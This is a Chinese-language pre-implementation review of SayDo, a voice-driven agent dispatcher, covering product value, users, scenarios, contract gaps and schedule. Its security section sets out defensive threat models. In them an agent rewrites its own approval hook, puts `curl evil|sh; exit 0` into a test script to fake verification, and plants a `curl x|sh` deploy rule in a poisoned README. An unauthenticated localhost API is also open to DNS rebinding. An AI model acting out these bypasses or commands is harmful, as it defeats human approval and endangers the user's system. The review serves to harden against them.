# SayDo 全景审视:真正的价值、用户、场景与残余缺口(2026-07-23,整合版)

> **性质**:开工前最后一轮独立全景评审,供 owner 审阅;**非 canonical 设计文档**,采纳项需按流程回写 docs/。
> **输入**:完整阅读 `README.md`、`docs/01–10`、`docs/adr/ADR-001`、`IMPLEMENTATION-PLAN.md`(v2.2)、`IMPL-PROMPT.md`、`AGENTS.md`、`templates/`、`history/scenarios/` 全部、`history/PROCESS-JOURNAL.md`、`research/`(竞品扫描、本地项目评估、脑暴、Codex 01/05/08 全文及 02/03/04/06/07/09 的文内引用)。
> **方法**:主评审【主】先独立成稿 → 并行 4 个 subagent 互补角度独立评审(【SA1 产品市场】【SA2 架构契约】【SA3 安全治理】【SA4 实施工程】,仅给"已知问题登记表"防重复,不透露主评审结论)→ 逐条 triage(采纳/部分采纳/不采纳)整合为本版。triage 记录见 §9。
> **独立性披露**:SA3 在评审中读到了本文初稿(当时已落盘),其与初稿同向的 3 条按"深化"而非"独立交叉"计;SA3 的四条最重发现(钩子自篡改/控制台无鉴权/setup 供应链/auto_low_impact)超出初稿范围。SA1/SA2/SA4 输出未引用初稿。SA4 声称的两项本机事实(Hopper 副本缺失、.env key 状态)已由主评审复核属实。
> **口径**:已被 Codex 01–09 发现且已回修、或已在 09 §14 / 各文档 [warn] 头部诚实登记的问题,本文不重复;只列**残余、新发现、或修复不充分**的项。级别:**A**=发实施 prompt / 开工前必须处理;**B**=对应 Phase 开始前处理;**C**=攒批清理/记录在案。

---

## 0. 结论速览(TL;DR)

**总判断:方向、诚实度和契约深度在"零代码项目"里是罕见的高水位;当前最大的风险不再是"设计错了",而是四件事:① 主故事的"验收后半程"(返工/合并/取消修订)在状态机、工具面、话术三处同时断链;② Tier 1 执行侧存在一条绕开整条语音授权链的旁路(审批钩子可被 agent 自篡改、verify oracle 可被自证、daemon API 无鉴权、setup 在审批前跑供应链脚本);③ 交接材料有失实与互斥表述(Phase -1 D"已完成"不实、三律 vs 四律、claude 后端三处口径打架);④ 设计边际收益已转负,文档漂移债在扩大,该冻结开工了。**

**四方独立交叉命中的最高置信发现**(至少两方独立发现):

| # | 发现 | 命中方 | 级别 |
|---|---|---|---|
| 1 | **验收-返工循环三重断链**:`ready_for_review` 无返工出边、§13 无打回/重试工具、10 无验收提修话术、人工合并推进到 `task_done` 无合法链——故事一的核心瞬间在契约上走不通 | 主 ⊕ SA1 ⊕ SA2(三方独立) | **A** |
| 2 | **dogfood 无评估门**:没有产品级度量、没有停/转信号、没有否决线;埋点需求决定必须 Phase 0 前定义 | 主 ⊕ SA1 ⊕ SA4(三方独立) | **A** |
| 3 | **IMPL-PROMPT"三律" vs 计划/09"四律"**:交接 prompt 把一条安全律(每条命令独立审批)静默丢掉 | 主 ⊕ SA4 | **A** |
| 4 | **claude_sdk 缺省后端口径互斥 + 实测本机有 ANTHROPIC_API_KEY**(已复核):0.0(b) 用现有 key 实测即可定生死,不必停在"未登录" | 主 ⊕ SA4 | **A→owner** |
| 5 | **cursor_cli 审批门完整性**:钩子建立在无契约的 vendor bug 态行为上、无版本锁、无 canary;且钩子文件在 agent 可写域内 | 主 ⊕ SA3 ⊕ SA4 | **A** |
| 6 | **billing-switch 收据应最薄化**(复用 approvals 表,不建新机器) | 主 ⊕ SA2 ⊕ SA3 ⊕ SA4(四方!) | B |
| 7 | **文档漂移债**:cursor 升 Tier 1 未 sweep 到 03/06;AGENTS.md canonical 范围过时;等十余处 | 主 ⊕ SA2 | B/C |

**单方发现但经核实/论证成立的最重项**:

- **[A]** 审批钩子自指可篡改:`hooks.json`/`gate.sh` 落在 worktree 内,agent 用 S1 文件写(非 shell,钩子看不见)即可改写审批器自身【SA3】(§4-S1)
- **[A]** daemon/控制台 localhost API 无鉴权:恶意网页经 DNS rebinding 可直接调 `confirmAndDispatch`/`approveAction`,旁路整条语音授权链【SA3】(§4-S3)
- **[A]** `memory_events` DDL 缺判别联合的列(targets/generation/stores),0.3 的 TS↔DDL round-trip 当场必红【SA2】(§4-C2)
- **[A]** `cancel_settled → superseded` 与"同卡修订缺省(task 身份不变)"自相矛盾,且修订后无返回执行态的边;ADR-001 操作表仍是旧 supersede 语义【SA2】(§4-C3)
- **[A]** 计划 Phase -1 D 写"均已完成",实测 `~/.saydo/hopper-dist`/`hopper-vault` 不存在(已复核)——新会话信任它会在首周 0.5 卡死【SA4】(§4-I1)
- **[B]** verify oracle 内容未冻结:worktree 内被验代码可改写 package.json 的 test 脚本,独立闸门被自证通过【主,SA3 深化出"命令注入+false-complete 双绕过"完整攻击路径】(§4-S2)
- **[B]** setup 命令在任何审批点之前执行现有依赖树的 postinstall(供应链洞)【SA3】(§4-S4)

其余 B/C 级见 §4–§5;过度设计与裁剪机会见 §6;整合后行动清单见 §7;owner 拍板题见 §8。

---

## 1. 真正的价值(整合判断)

### 1.1 价值分层:三层递进,承重点不同

**第一层:立刻可感的效用(获客钩子,但已商品化)**
免打字派活、离开键盘继续推进、"做完叫我"、来电式汇报。Codex 红队已证实(01 §10):语音、本地 daemon、后台执行 + 通知、移动遥控在 2026-07 已被 Paseo / Codex from anywhere / Claude Cowork 商品化。**这一层只能做"不输",不能做"赢"。**

**第二层:用久才显的结构价值(真正的差异化,但不可见)**
- **持久项目记忆 + 奠基**:第 N 次对话从"AI 已经懂项目"开始——与"ChatGPT 新窗口"的分水岭;
- **决策包纪律**:成果预览 + 人机分工计划 + 验收标准,把"表达负担"换成"判断负担"——这个交互形态没有语音也成立;
- **诚实治理闭环**:状态词纪律、所闻即所签、独立就绪评估、可撤销记忆。产品表述已被红队精准归纳并被文档吸收:"**SayDo 能较早发现自己还不该开工**"。
- 关键矛盾:**这一层用户看不见**——误开工少、返工少、记忆没被污染,都是"没发生坏事"的价值,只能靠长期体感和数据呈现(所以 dogfood 度量是战略问题而不是工程细节,见 §4-P1)。

**第三层:对 owner 个人的确定价值(最低风险的底仓)**
即使不对外发布:① owner 的日常生产力工具(BYOA 使边际成本几乎只剩语音 API);② 自家生态(Hopper/OctoDesk)的语音前脑与首个真实消费者——对接裁决已反向推动 Hopper 批次 A;③ 一套经 9 轮对抗评审的 agent 治理契约资产,可移植到任何后续产品。**这层价值不依赖 PMF 成立**,是"值得做"的保底论证。

### 1.2 与文档自述的三点修正

**修正一:留存引擎和差异化引擎不是同一个东西,P0 打磨应偏向前者。**
大而模糊的任务每周只有 1–3 次;小任务派发、进度问询、回叫验收、**返工循环**每天发生多次。决定"明天还用不用"的是后者的顺滑度。P0 的质量堆料(golden、打磨轮次)应优先覆盖高频路径——而目前恰恰是最高频的"验收-返工"循环三处断链(§4-C1)。

**修正二:P0 样本无法验证核心范式假设,dogfood 结论要防误读。**【SA1 尖锐化】
第一性原理服务的是"给不出指令的人"(01 §4:"多数人包括老板本来就给不出好指令");而 P0 唯一用户是"能用技术语言下指令、甚至直接点名用哪个 agent"的工程师(owner 本人)。dogfood 能验证的是语音 + 异步 + 回叫对 S1 的**效率价值**;"对话优先于指令"的**范式价值**落在 S2/S3 人群(P2/P3),P0 既不能证真也不能证伪。两个后果:① dogfood 成功不要解读为"范式已验证";② Quick 车道占比高不要解读为"哲学失败"(红队假设 9 的否决线要按此重新解释)。低成本的半验证:统计 owner"开口时说不清 → 采访后成型"的会话占比。

**修正三:P0 阶段的"离席异步"名不副实,要写进期望管理。**【SA1】
P0 只有逐步确认档:每个 S2 前置确认 + 每个步骤边界 30 秒无应答即停靠;回叫只有在线语音/桌面通知/ntfy,移动端 P1。早期 dogfood 中"走开"的真实半径 ≈ 听得到电脑说话的范围,离席体验只对"单步且无 S2"的任务成立,直达验收(P0.5)才部分解锁。不改分期,但 dogfood 判据应分"单步/多步"两组记读数,评审时明示该限制——否则体验落差会被误记为"产品不行"。

## 2. 潜在用户(由近及远五环)

| 环 | 用户 | 与设计的匹配度 | 备注 |
|---|---|---|---|
| 0 | **owner 本人**(P0 唯一用户) | 完美:BYOA、Hopper、中文、双订阅 | P0 就是为这一环设计的,合理 |
| 1 | **已付 AI 订阅的资深独立开发者 / 小团队 tech lead**(中文口语) | 高:BYOA 天然贴合;多项目、常离机、通勤/碎片时间场景 | 首发后最现实的种子人群;对"诚实状态词"最敏感、最能识别治理价值 |
| 2 | **以 review 为主的工程管理者** | 中高:review 证据视图 + 回叫 + 手机验收正中日常 | 文档低估的一环——他们不写码但天天验收,review 面对他们是主界面 |
| 3 | **非技术创始人 / 产品负责人**(S2) | 已覆盖但排 P3,正确 | "文字模式"(§4-P5)是他们未来的入口保险 |
| 4 | **无障碍需求用户**(RSI / 视障 / 不便打字者) | 潜在高,文档几乎未提 | 不要求 P0 做,要求 P0 不封死(文字等价路径) |

两条边界应显式写下(目前是隐性假设):① **中文单语硬编码**——42 条话术、instructions、golden、热词全中文,换语言 ≈ 话术体系重做(槽位/契约结构可复用);这是合理的 wedge 取舍,但应作为产品边界写进 02 §7 或 05【主 ⊕ SA1 交叉】。② **"咨询型会话"是一等产出**——真实使用中相当比例会话是问代码/捋思路,本不该派单;若价值统计只数派单,系统与评估都会倾向过度推收敛,违背"不过早逼用户拍板"(01 §4)【SA1】。

## 3. 使用场景:频谱、覆盖度与盲区

### 3.1 按真实频率排列的场景频谱(P0 视角)

| 频率 | 场景 | 文档覆盖 | 评价 |
|---|---|---|---|
| 每天多次 | 小任务口述派发(Quick 车道) | [ok] 02 §5 三档位 | 好;"修 typo 不该听模式问句"的细节到位 |
| 每天多次 | 进度问询 / 挂起重建 / 回叫接通 | [ok] 04 §3–4、10 #23/#29 | 好 |
| 每任务一次 | **验收 → 提修改 → 返工 → 再验收** | [fail] **状态机/工具/话术三缺**(§4-C1) | **盲区,且是最高频闭环** |
| 每天 1–N 次 | S2 审批(逐步确认档) | [ok] 04 §5.4、09 §3 + presentation 最小版 | 好;多 pending 反例要进 P0(§4-P11) |
| 第一周必撞 | **第二单进队列(单队列排队)** | [fail] 无排队告知话术、无队列可见位(§4-P3) | 【SA1】新发现 |
| 每周 1–3 次 | 大而模糊任务:采访 → 决策包 → 拍板 | [ok] 04 §2(设计最厚处) | 好,但注意 §1.2 修正一 |
| 必然出现 | **采访预算耗尽但未就绪的收口** | [fail] 无话术无出路(§4-P4) | 【SA1】新发现 |
| 每项目一次 | 奠基 / 学习中 | [ok] 预算化 + partial manifest + 进度话术 | 好;"足够"判定门已列 owner 未决 |
| 偶发 | 改需求(执行中 steer) | [ok] 03 §5 双语义 + 10 #24/25 | 好 |
| 偶发 | 记忆纠错 / 撤回 / 溯源 | [ok] 10 #36–38 | 好 |

### 3.2 覆盖得好的(设计亮点,值得保住)

- **三档正交**(车道 × 执行模式 × 治理深度)+ 守门句("可以调快,不能调低风险门槛")——全套文档最漂亮的产品纪律;
- **状态词三级 + settle barrier**:对"假完成"的防御是同类中最完整的;
- **draft 项目"开口即建,不出表单"** + re-anchor 提议制:把最容易做成表单地狱的环节做成了对话原生。

### 3.3 盲区场景(建议显式表态:做、排期、或列非目标)

1. **应急/事故车道**(Codex 01 §5 提出,docs 从未回应):生产出事时"先奠基后采访"是错误姿态,而语音恰恰在手忙脚乱时最有价值。至少在 05 列一行表态。【主】
2. **多任务回叫聚合**:P1 多任务后同时 blocked/ready 会回叫风暴;04 §4 输出仲裁只解决"不插话",没解决"聚合成一条"。P1 backlog 加一行。【主】
3. **无障碍 / 纯文字模式**:见 §4-P5。【主】
4. **首次激活/空白画布**:话术 #1–#5 都假设项目/会话已有着落,"全新用户第一次开口"无引导模板。对 owner 非问题;引入第二个用户前必补(竞品扫描点名"开工前 30–60 秒口头复述理解"是无人做的第一分钟体验)。【SA1】

---

## 4. 缺口(Gaps,按主题分组)

### 4.A 执行侧安全旁路(SA3 主贡献;这组共同构成"绕开语音授权链的第二条路")

> 定性:语音弱认证侧(S3 永不放行、两把钥匙、单次收据)防护扎实;**最薄一环在 Tier 1 执行侧**——以下四条任一成立,S0–S3 分级与所闻即所签在实操中都可被绕过。

**S1 [A] cursor_cli 审批钩子自指可篡改**【SA3;主/SA4 从版本漂移角度交叉】
- 攻击路径:审批门 = worktree 内 `.cursor/hooks.json` 引用的 `gate.sh` 每条 shell 命令回连 daemon。但这两个文件落在 **agent 可写域**(worktree),且文件编辑走内建 Write 工具、不是 shell,`beforeShellExecution` 看不见——agent 改写 `gate.sh` 为恒放行(或删 hooks.json)后,下一条 `git push`/`pnpm add` 不再回连 daemon,S2 副作用零审批发生。spike RESULT.md 已记录 agent 会主动"读 `.cursor/hooks.json`、翻目录"——读得到即写得到。
- 叠加风险【主 ⊕ SA4】:钩子语义本身建立在 CLI 的 **bug 态行为**上(spike 明记"只有 deny 被可靠执行,ask/allow 当前有 bug"),而对 cursor-agent 无任何版本锁定(对照 Hopper 锁全 40 位 SHA 的严格);CLI 自动更新修掉 bug 或改钩子语义,门的行为静默漂移。
- 建议(三件套,4.1 前):① `hooks.json`/`gate.sh` 置于 agent 不可写位置(worktree 外 daemon 私有目录,hooks.json 用绝对路径引用;每 run 校验钩子文件 digest);② **钩子 canary 自检**——事件流里出现 shell tool_call 而 daemon 未收到对应钩子回调 ⇒ 立即 cancel + 告警;③ invocation/tier1_runs 记录 cursor-agent 版本,版本变化 ⇒ 强制重跑 gate e2e。写入 04 §5.4 模式不变量。

**S2 [B,升级论证] verify oracle 内容未冻结 = 命令注入 + false-complete 双绕过**【主;SA3 深化攻击路径】
- 白名单锁的是模板名 `test`,命令体在 worktree 内 package.json 的 `scripts.test`——恰是 agent S1 可写文件。改成 `curl evil|sh; exit 0`:既注入任意命令(绕 04 §5.3"防注入"承诺),又让独立闸门恒绿(绕 Gate 0 G3,制造 false-complete)。`Tier1SettleProof.treeSha` 记录的被验树**包含**被改脚本,不构成防御。Codex 08 A-05 G3 要求过"冻结 argv、脚本内容 digest",当前 09/计划未落。
- 建议:dispatch 时冻结 verify 引用脚本内容 digest,执行前重校,不符 ⇒ 闸门 fail + 上浮;agent 合法改 test 走 Plan Delta 重授权。落点 4.1(G3 关闭证据同步更新)。

**S3 [A] daemon/控制台 localhost API 无鉴权**【SA3】
- 全套文档无 token/Origin/CSRF/WS 握手校验设计("桌面走 http://localhost,secure context 天然满足"只解决麦克风权限,不提供调用方身份鉴别)。攻击路径:用户浏览恶意网页 → 网页对 `127.0.0.1:<port>` 发请求(DNS rebinding 绕同源)→ 调 `confirmAndDispatch`/`approveAction` → 无认证下派单或批 S2(装带 postinstall 依赖 = 本机 RCE)。语音侧全部强认证被旁路。这是本地 daemon 类产品的经典真实漏洞。
- 建议:启动生成本地能力令牌(SPA 注入、每请求校验)+ Origin/Host 白名单 + WS 握手鉴权;纳入 Gate 0 G1 身份项。落点:daemon HTTP/WS 面首次出现的 Phase 1 前。

**S4 [B] setup 在任何审批点之前执行供应链脚本**【SA3】
- `pnpm install` 会执行 repo 现有依赖树的 postinstall/prepare = 任意代码执行,发生在 worktree 供给阶段、任何 S2 审批之前;EffectGrant 的"带 postinstall 的包自动出清单"只管**新装**依赖。lockfile 投毒或恶意仓即中招。
- 建议:setup 默认 `--ignore-scripts`(或容器/`sandbox-exec` 内跑);必须跑脚本时视为一次 S2、进 delivery preflight 显示、新仓首次确认。归 Gate 0 G4。

**S5 [B] cursor_cli 内建非 shell 通道(读文件/网络)不受钩子约束**【主 ⊕ SA3 交叉】
- 内建 Read/web 工具不过 shell:"读 `.env` 升 S2"在该后端不触发;egress 不可拦截。Claude SDK 的 canUseTool 覆盖所有工具无此洞——而产品缺省 claude_sdk 恰恰可能零日用(§4-I2)。
- 建议:cursor 后端能力表标 `egress=uncontrolled`、禁 network_fetch 类预授权;0.0(a) 补验 `beforeReadFile`/`preToolUse` 的 deny 可靠性与"内建网络工具能否配置禁用";真需隔离走容器。G4 证据按后端如实分行。

### 4.C 契约断链(SA2 主贡献)

**C1 [A] 验收-返工循环三重断链(全场最重要的单一发现,三方独立命中)**【主 ⊕ SA1 ⊕ SA2】
- **状态机**:09 §6.1 中 `ready_for_review` 出边只有"→ review_approved_waiting_merge(U:验收通过)"与"→ cancel_requested(T:停靠老化)"——没有"打回携指令重跑"的边,甚至没有用户主动取消的边。
- **工具面**:§13 无任何 review verdict/打回/重试工具(`review_request_changes`/`retry` 只存在于 §6.2 HopperCommand,Brain 面缺位;steerTask 语义限运行中);`requestManualMerge` 的 watcher 观察到外部合并后,从 `ready_for_review` 推进到 `task_done` **无合法转换链**("review_approved_waiting_merge → merging"的前提'L:调 merge'在 P0 人工合并下不成立)——计划 5.4 总验收"ready_for_review→人工合并→task_done ×3"在契约上走不通。
- **话术**:10 §2.4 覆盖了回叫/blocked/failed/merge/交付/取消,唯独没有"用户听完 one_liner 说'不行,改 X'"的模板(修改意见确认、返工派发含后端语义如实说明、二次回叫、部分通过均缺);golden 以话术表为纲,该环节因此也无验收。
- **建议**:① §6.1 补三条边:`ready_for_review → running(U:打回携指令;Tier1=同 task 新 attempt 复用 worktree,Hopper=request_changes+retry)`、`ready_for_review → cancel_requested(U)`、`ready_for_review → task_done(L:manual-merge watcher 确认 + 合并 proof)`;② §13 补 `reviewTask(verdict, comments?)` 工具并绑收据;③ 10 §2.4 补 3–4 条返工话术并入 golden;④ §12 补"返工新 attempt 的 settle proof 不与旧 attempt 串线"反例。落点:Phase 3 末/4 前。

**C2 [A] MemoryEvent 判别联合无法落进声明的 DDL**【SA2】
- §4 定义 `forget_hard` 携带 `targets/targetDigests/generation/stores`、`invalidate/forget_soft` 携带 `targets/reason`,且 generation 是"与 tombstone 同事务的持久计数器";但 §9 `memory_events` 表**没有这些列**,持久计数器无表可存。0.2a 编 zod 判别联合、0.3 跑 TS↔DDL round-trip(§12-9)当场必红;Phase 2.1(P0)的 forget_hard 崩溃重放依赖这些字段。§14-A6 登记只覆盖"完整形态(独立 job 表)",不覆盖基础列缺失——登记不充分。
- 建议:memory_events 增列(或 payload_json 判别存储 + op 组合 CHECK),generation 给持久落点。开工前改(0.2a 依赖)。

**C3 [A] `cancel_settled → superseded` 与"同卡修订缺省"自相矛盾;ADR 未随 v2.2 ⑥ 回填**【SA2】
- §6.1 该行自己的批注写"改需求**缺省=同卡修订链**(re-drop `updated_draft`+`retry`,**task 身份不变**);显式换卡才走新 id"——缺省路径不换卡,却被写成进入 `superseded`(换卡语义);同卡修订后**无 `cancel_settled → queued/running` 的边**,走不回去。Tier 1 的 `cancel_resume` 应答同样需要这条边。另:`confirmed/queued` 没有 cancel 入边(排队中任务不能取消)。ADR-001 操作归属表仍写旧语义"cancel + 重新 drop 修订任务卡(supersede 关联)",与计划 v2.2 ⑥"supersedes 改同卡修订缺省"冲突且无 [warn] 豁免头。
- 建议:拆两条边——`cancel_settled → queued(L:同卡修订 re-drop)`与 `cancel_settled → superseded(U:显式换卡)`;补 `confirmed/queued → cancel_requested(U)`;同步 ADR-001 操作表。

**C4 [B] 审批 decision 词表三处不一致 + respond 无 outcome 出边**【SA2】
- 04 §5.2 是四动作(accept/edit/respond/ignore,语音只给 accept/ignore);09 §3 是五值(多 reject);outcome 转换表中 **decision=respond 无任何出边**;§13 `approveAction` 又只开放 accept/reject——语音按 04 应给的 ignore 不可达。
- 建议:统一为 09 五值并回写 04;给 respond 定出边(如 respond→consumed 附答案注入)或删除;approveAction 枚举与语音词表对齐。

**C5 [B] blocked 的 occurrenceKey 两处定义冲突**【SA2】
- 09 §6.3:"blocked/failed→**episode 序号**"(episode 未定义);10 #30 槽位注:"occurrence key=**task_id+触发事件 event_id**"。两口径去重行为不同,且 event_id 是 Hopper 概念、Tier 1 blocked 无 event_id。
- 建议:09 定唯一口径(Hopper=event_id、Tier1=questionId),10 #30 引用 09。

**C6 [B] outbox trigger 枚举缺两条 P0 话术的载体**【SA2】
- trigger 只有 5 值;10 #35"停靠老化取消"(T 触发、人不在场必经回叫)与 #41"订阅限流·异步告知"(明写"经回叫链")均标 P0,却无对应 trigger 与 occurrenceKey 规则。
- 建议:枚举扩 `parked_expired`、`subscription_stalled`(或明确借道 blocked 并给 key 规则)。

**C7 [B] 投影 total mapping 的条件洞 + 他端取消产生非法转换**【SA2】
- §7 在裸枚举上 total,但条件维度留洞:`task=review ∧ settle 未通过/迟滞`(§6.3 明说"120s 超时报 settle 迟滞")无投影行——ADR 读路径表有"在过验证闸门"行,09 §7 没收编。他端取消(Hopper Console 发起,双入口合法场景):投影产出 `cancel_settled`,但 §6.1 没有 `running/blocked → cancel_settled(P)` 的边。
- 建议:§7 补"review∧未 settle"行;§6.1 补他端取消边。

**C8 [B] Tier1 运行侧契约还有三个小洞**【SA2】
- tier1_runs 有 7 态 CHECK 但**无转换表**(TaskCard 有表,它没有);`attempt` 字段暗示多 attempt,却无"settled_failed 后开 attempt 2"的触发工具(10 #31 明明提供"重试"选项);Tier1 的 **blocked/failed 回叫拿什么 settle proof** 未定义(§6.3 只定义了 ready_for_review 的 Tier1SettleProof 与路径二的 FAILED/BLOCKED 判定)。
- 建议:补 tier1_runs 转换表、`retryTask` 工具、Tier1 blocked/failed 最小 proof(questionId/exit 证据 + transcriptCursor)。与 C1 的"新 attempt"语义一并定。

**C9 [C] digest 矩阵漏行与主键碰撞**【SA2】
- §0.1 自称覆盖 Tier1,但 `Tier1SettleProof.tier1VerifyDigest`(回叫安全根基)无 producer/签名域/verifier 行;`HopperCommand.payloadDigest` 行写"签名域见 §6.2",§6.2 实际没给。`context_snapshots` 以 pack_digest 单主键,而 digest 签名域排除 sessionId——同输入两会话撞主键,审计丢会话绑定。
- 建议:矩阵补 tier1VerifyDigest 行;§6.2 给 payloadDigest 签名域;snapshots 主键改 (pack_digest, session_id) 或拆内容寻址表+绑定表。

### 4.P 产品与治理缺口

**P1 [A] dogfood 评估门:度量、停/转信号、否决线三缺(三方独立命中)**【主 ⊕ SA1 ⊕ SA4】
- 现状:P0 出口仅"owner 能每天自用";readiness shadow 有落库设计但没有"攒多少样本、何时回看"的节拍;全计划无一处定义"什么信号说明该停/该转向";红队给过的否决线(§10.4:3–6 个月内不能在 false-ready/first-pass acceptance/repair time 上显著优于"Paseo/Codex/Claude + 普通语音"则收缩为 transport)无人承载。owner 原话"不用担心判断错误浪费工作量"移除了 P0→P0.5 间的自然检查点——那评估门就更必须显式建。
- 建议(开工前定义,场次②起周更,全部可从现有账本 SQL 出):周派单数、Quick vs Guided 占比、**无派单但有沉淀的会话占比**(咨询型会话计为一等产出【SA1】)、回叫接通率(notified→acked)、误听纠正次数(addHotword)、**返工循环数**(C1 落地后 attempt>1 占比)、决策包首过接受率、readiness shadow 样本数与 false-ready 计数、周成本(api vs subscription)、**单步/多步任务分组的离席体验读数**(§1.2 修正三)。同时定 3–5 个停/转信号(如连续 N 天未自用、每任务人工干预次数阈值)+ 缺省动作,写进 evidence 模板。

**P2 [B] 排队话术与队列可见性缺失**【SA1】
- P0 是单队列,owner 多仓第一周必然出现第二单;话术表无一条"第二单在排队"的告知——系统沉默违背自家"失败可见性"原则,摩擦会被误记为"产品不行"而非"分期未到"。
- 建议:补一条排队告知话术 + Dashboard 队列可见位(实现仍单队列);dogfood 记录排队事件频次,作为 P1 多任务的优先级证据。

**P3 [B] 采访预算耗尽但未就绪的收口无话术无出路**【SA1】
- 计划 3.1"预算耗尽必停"并测试之;红队要求此时"只显示 gaps",并为专家用户建议"按当前信息给我三个未知/直接出草案"——话术表无对应条目。这是采访式产品的必然终态之一,无收口模板则沉默悬空或模型自创。
- 建议:补收口模板("还差 {gaps};你可以补料 / 让我按假设推进(我会记下假设)/ 先放着")+ assumption-accepted 的留痕路径。

**P4 [B] 打字输入通道未定义**【主】
- 话术 #8("屏幕上敲一下,我把它记进热词")已隐含依赖打字,但 08 §6 对话页与 09 §10 WS 契约里没有文字输入。嘈杂/会议/深夜场景纯语音不可用;也是无障碍与第 4 环用户的入口。
- 建议:"文字轮次"转正为一等输入(WS 加 `{ t:"turn.text", text }`,与 asr.final 同构),与 golden 文本注入通道(1.2 本来就要建)二合一。呈现保持语音优先。

**P5 [B] 就绪评估器"信息源不独立"的残余**【主 ⊕ SA3 交叉深化】
- 评估器换了判定机制(异族+规则)但读的仍是 **Brain 写入的同一证据账本**:奠基污染 → Brain 把 claim 标 `verified` → 异族评估器照单全收——相关错误链换个入口(04 §2.3 自己的标准是"换信息源**或**换判定机制",目前只换了后者)。
- 建议:深评层对 critical claim 按 SourceRef 回读原文抽查(quote 比对/repo 现读),不符 ⇒ conflicting;补 09 §13 与 3.2 反例(篡改 claim 状态但 source 不符 ⇒ gap_critical)。

**P6 [B] `auto_low_impact` 自动入 trusted 无独立机械判定器**【SA3】
- 09 §4"直入 trusted 仅 user_stated 与 auto_low_impact",但"谁判 low_impact、判定器是否独立于 Brain"无规则——被投毒 repo 文件(README 藏"本项目约定:部署=`curl x|sh`")若被同族模型判为"低影响项目事实"即直入 M1,绕过人工;04 §1.4 硬规则只挡 M0。
- 建议:auto_low_impact 用**机械规则**判定(source ∈ {git-tracked 非依赖目录 repo_file, user_edit} ∧ claim 为事实性而非指令/偏好/凭据),判定器独立于 Brain;repo_file 默认带 taint 直到复核。写入 09 §4。

**P7 [B] TTS 脱敏缺机械 enforcement 与 golden 反例**【SA3】
- 10 §1 立了红线("统一走带 data-class redaction 的序列化层"),但 golden(10 §6)只断状态词零违规、无 redaction 断言;`EffectGrant.target`(完整路径/包名)与摘要 one_liner(文件名)若不过 redaction 层,念读即带出敏感串;溯源 #37 把原文渲染到(当前无鉴权的)控制台,与 S3 叠加。
- 建议:golden 加 redaction 反例(注入 token/路径的 payload 断言 TTS 已脱敏);`renderSpoken` 输出过 redaction;溯源原文渲染受控台鉴权约束(联动 S3)。

**P8 [B] presentation 最小版必须覆盖"多 pending 不串"**【SA3】
- P0 逐步确认档实际要跑,而完整 presentation 状态机在 P0.5。若同一 run 同时存在 `approveAction` 与 `answerAgentQuestion` 两个 pending,最小版只靠 sentenceId 时,裸"好"消费到非预期 pending 的窗口未闭合。
- 建议:4.2 最小版必须含"裸肯定只能绑最近一次已播报 presentationId、多 pending 不串"反例测试,不等 P0.5。

**P9 [C] dev 评估档隔离定性应改述**【SA3,部分采纳】
- 07 D18 自认"tripwire 是事后检测,内容已回给模型"——那么 dev 下评估器读到 `~/.saydo/` 转写时,损害(跨项目数据进模型上下文 + 评估被污染)**已发生**,`evaluator_isolation="unproven"` 的定性偏软,应为"隔离性=无(已知可读)"。措辞修正便宜;进一步的 `sandbox-exec` 读禁闭加固列为可选(dev-only、owner 自担)。

**P10 [C] 其余小缺口**
| # | 缺口 | 建议 |
|---|---|---|
| a | draft 项目无老化清理 | 09 §1 加 draft 老化(7 天无活动 → archived)【主】 |
| b | 语音延迟(P50 1.5s)无分段预算表 | 1.0/1.1 spike 顺手产出 VAD/ASR/LLM/TTS 分段表【主】 |
| c | evaluator 订阅限流时 propose_start 全阻塞的降级姿态未写 | 补"评估暂不可用"话术分支,归 owner 定姿态【主】 |
| d | `SayDo` 商标/撞名尽调未留痕 | 快速检索一次留痕【主】 |
| e | hard-forget 的 `stores` 枚举含 "backup",但 0.1 的定时快照备份删不到 | 见 §4-I5,推荐砍自动备份【SA3 ⊕ SA4 交叉】 |
| f | 首发前近邻重扫 | P0.5 收尾仪式加半天轻量重扫,校对"已审样本中无做全者"表述届时是否仍成立【SA1】 |

### 4.I 实施与工期(SA4 主贡献)

**I1 [A] 计划 Phase -1 D"均已完成"失实(已本机复核)**【SA4,主复核】
- 计划 D 行写"均已完成(2026-07-23)……副本 `~/.saydo/hopper-dist`(git checkout + npm ci && build)/`HOPPER_VAULT=~/.saydo/hopper-vault` + `hopper init`";实测两个路径**均不存在**。新会话信任"已完成"不会复核,首周 0.5 手动 PoC(需要锁定副本 + 专用 vault,ADR 红线禁用 dev checkout)即卡死并回头找 owner。
- 建议:D 措辞改"裁决/三元组已定稿,**副本待落地**"并列入 IMPL-PROMPT [warn] 发送前置;或 owner 发前物理装好。

**I2 [A→owner] claude_sdk 后端:三处口径互斥 + 本机实际有 ANTHROPIC_API_KEY(已复核)**【主 ⊕ SA4】
- 互斥三处:0.0 写"至少一个后端成立即可开工";风险表写"Claude SDK 四能力**任一不成立**……立即停止上浮(P0 已无退路)"(单后端时代旧文);4.0 仍写"**三能力**全链复验"(0.0 已升四能力,4.0 未同步)。文档链断言"claude [fail] 未登录",但 `~/.saydo/.env` 中 `ANTHROPIC_API_KEY` 已配置(额度未验)——Agent SDK 支持 API key,**0.0(b) 用现有 key 实测即可定生死**,不必停留在"未登录"。
- 若不实测:产品缺省后端(canUseTool + live steer 完整体)可能整个 P0 从未在本机跑过就进首发,owner 日用的永远是降级形态(无 live steer 的 cursor_cli),话术 #24 永远播不出来。
- 建议(上浮 owner):优先用现有 key 在 0.0(b) 实测四能力 + 记账口径;通过 ⇒ 产品缺省后端可日用、dev-profile 特例链可降级缓做(§6-O1);不通过再谈买订阅/改缺省。同时统一 0.0/风险表/4.0 三处措辞。

**I3 [B] Phase 1 算术不成立;P0.5 6–9 日系统性低估**【SA4】
- Phase 1 标称 5–7 天,内含两个真音频 spike + 1.2b BYOA"边际 2.5 天"+ WS 契约/注入通道 + 会话/对话引擎 + golden 框架;1.2b 是 dev 机缺省供给后端(确定范围),却外挂于相加口径;单实施者下"1.2b 与 1.3 并行"不缩短墙钟。P0.5:Codex 08 已判 6–9 不可信(生产 bridge 既有估算 1–2 周),v2.2 只统一了 P0 口径、P0.5 未动;且过渡兜底合同意味着 bridge 要按"兜底 + 批次 A"两套形态跑测试。
- SA4 校准区间:**P0 = 28–38 工程日,P0.5 = 10–16 工程日**(≈原口径 ×1.4);三大不确定源 = Pipecat 打断 spike(失败时"当天切 LiveKit"实际是 2–4 天重铺)、Tier1 后端(cursor 钩子在真实多步任务的覆盖面 + claude 额度)、Hopper 批次 A 另仓排期。
